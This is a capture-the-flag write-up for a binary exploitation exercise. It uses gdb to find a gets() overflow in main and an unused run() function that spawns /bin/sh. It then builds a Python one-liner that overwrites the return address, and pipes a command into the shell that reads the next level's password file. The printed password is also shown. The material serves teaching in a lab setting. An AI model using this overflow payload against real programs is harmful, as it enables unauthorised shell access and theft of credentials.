## LEVEL 1
---

The first thing to do is to inspect the list of functions.

```shell
(gdb) info functions
[...]
0x08048444  run
0x08048480  main
[...]
```

Now I will disassemble these two functions to understand what they do.

```shell
(gdb) disas main
[...]
0x08048486 <+6>:	sub    $0x50,%esp
[...]
0x08048490 <+16>:	call   0x8048340 <gets@plt>
[...]
(gdb) disas run
0x08048472 <+46>:	movl   $0x8048584,(%esp)
0x08048479 <+53>:	call   0x8048360 <system@plt>
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

Now I know that the `main` function runs the `gets` function but does not call the `run` function. The `run` function runs the `system` function with `/bin/sh` as an argument.

If I want to access the `.pass` file, I need to find a way to call the `run` function from within `main`.

But before doing that, I will search for information on what the `gets` function does.

```
Description
fgetc() reads the next character from the stream and returns it as an unsigned char cast to an int, or EOF on end of file or error.

Bugs
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
It is not advisable to mix calls to input functions from the stdio library with low-level calls to read(2) for the file descriptor associated with the input stream; the results will be undefined and very probably not what you want.
```

Okay, this text explains that the `gets` function should not be used because it is vulnerable to a *buffer overflow attack*. To understand what a buffer overflow attack is, [read this](../x86_docs/buffer_overflow_attack.md).

So, I will use this vulnerability to change the return value to point to the `run()` address.

---

### Now it's time to attack the binary.

### 1. Find the address where the return value of the `main()` function is stored.

To do that, we have two ways:
- Use an EIP tool like [this one]("https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/")
- Use GDB manually

I will use the second way to improve my knowledge of GDB.

```shell
(gdb) x $esp
0xbffff6e0:  0xbffff6f0
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args:
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
```

So, I just have to calculate `(0xbffff738 + 4) - 0xbffff6f0` and I get `76`.

Now, I will write 76 random letters followed by the desired return address.

```shell
(gdb) i func
0x08048444  run

$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Perfect, this works. Now, I need to write a command to print the `.pass` file before the program exits.

```shell
$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; echo "cat /home/user/level2/.pass") | ./level1
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```
---
*Source :*

*https://linux.die.net/man/3/gets*
